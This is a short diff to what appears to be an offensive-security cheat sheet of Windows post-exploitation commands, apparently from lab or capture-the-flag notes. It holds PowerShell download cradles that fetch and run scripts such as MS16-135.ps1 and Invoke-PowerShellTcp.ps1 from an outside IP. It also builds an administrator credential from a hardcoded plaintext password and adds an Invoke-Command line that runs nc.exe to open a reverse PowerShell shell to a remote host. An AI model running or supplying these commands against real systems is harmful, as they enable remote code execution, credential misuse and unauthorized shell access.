@@ -71,12 +71,17 @@ powershell (new-object System.Net.WebClient).DownloadFile('http://192.168.119.14
 
 powershell -C IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.149/MS16-135.ps1')
 
-#Auto-Login
+#Auto-Login (User pivoting)
 
-$passwd = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force;$creds =New-Object System.Management.Automation.PSCredential('administrator', $passwd)
+$passwd = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force;
+
+$creds =New-Object System.Management.Automation.PSCredential('administrator', $passwd)
 
 Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadString('http://192.168.119.149/Invoke-PowerShellTcp.ps1')" -Credential $creds
 
+#or
+
+Invoke-command -Computer fidelity -scriptblock { c:\\inetpub\\wwwroot\nc.exe 10.10.14.94 1234 -e powershell.exe } -Credential $creds
 
 
 #Runas
